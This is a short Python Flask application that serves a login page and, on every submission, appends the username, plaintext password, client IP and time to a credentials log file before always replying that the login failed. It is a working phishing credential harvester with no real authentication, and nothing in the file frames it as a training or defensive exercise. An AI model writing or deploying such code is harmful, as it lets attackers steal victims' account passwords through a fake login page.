from flask import Flask, request, render_template
from datetime import datetime
import os

app = Flask(__name__)

LOG_PATH = "logs/credentials.log"
os.makedirs("logs", exist_ok=True)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        ip = request.remote_addr
        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        with open(LOG_PATH, "a") as f:
            f.write(f"{time} | IP: {ip} | Username: {username} | Password: {password}\n")

        return "Login failed. Please try again."

    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
